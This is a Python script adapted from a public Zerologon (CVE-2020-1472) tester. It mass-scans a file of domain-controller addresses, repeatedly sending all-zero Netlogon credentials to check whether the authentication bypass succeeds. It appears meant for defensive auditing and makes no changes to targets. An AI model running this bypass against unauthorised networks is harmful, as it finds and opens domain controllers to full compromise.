#!/usr/bin/env python3
#
# copied from https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py
# and modified for masscanning

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time, os
from binascii import hexlify, unhexlify
from subprocess import check_call



# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%



def log(log_entry):
  lt = time.strftime("%Y-%m-%d %H:%M", time.localtime(time.time()))
  with open(logfile, "a") as lf:
    lf.write("%s, %s\n" % (lt, log_entry))

  

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  #~ sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    
    # It worked!
    assert server_auth['ErrorCode'] == 0
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    try:
      rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    except:
      continue
    if rpc_con == None:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\n[+] %16s | Success! DC can be fully compromised by a Zerologon attack.' % dc_ip)
    log("%s, %s, vulnerable" % (dc_ip, target_computer))
  else:
    print('\n[-] %16s | Attack failed. Target is probably patched.' % dc_ip)
    log("%s, %s, OK" % (dc_ip, target_computer))


if __name__ == '__main__':
  if len(sys.argv) < 2:
    print('Usage: zerologon_tester-mod.py <input_file>\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    scan_input = sys.argv[1]
    logfile = "%s.log" % scan_input
    if not os.path.isfile(logfile):
      with open(logfile, "w") as lf:
        lf.write("")
        
    with open(scan_input, "r") as si:
      for line in si:
        
        dc_ip, dc_name = line.split(",")
        dc_ip = dc_ip.strip()
        dc_name = dc_name.strip()
        run_check = "yes"
        # check if ip has been chacked already
        # load file new on every run, so dupes will be ignored
        with open(logfile, "r") as lf:
          for line in lf:
            if line.find(dc_ip) > -1:
              print("[i] %s already checked, skipping" % dc_ip)
              run_check = "no"
              break
        if run_check == "yes":
          perform_attack('\\\\' + dc_name, dc_ip, dc_name)


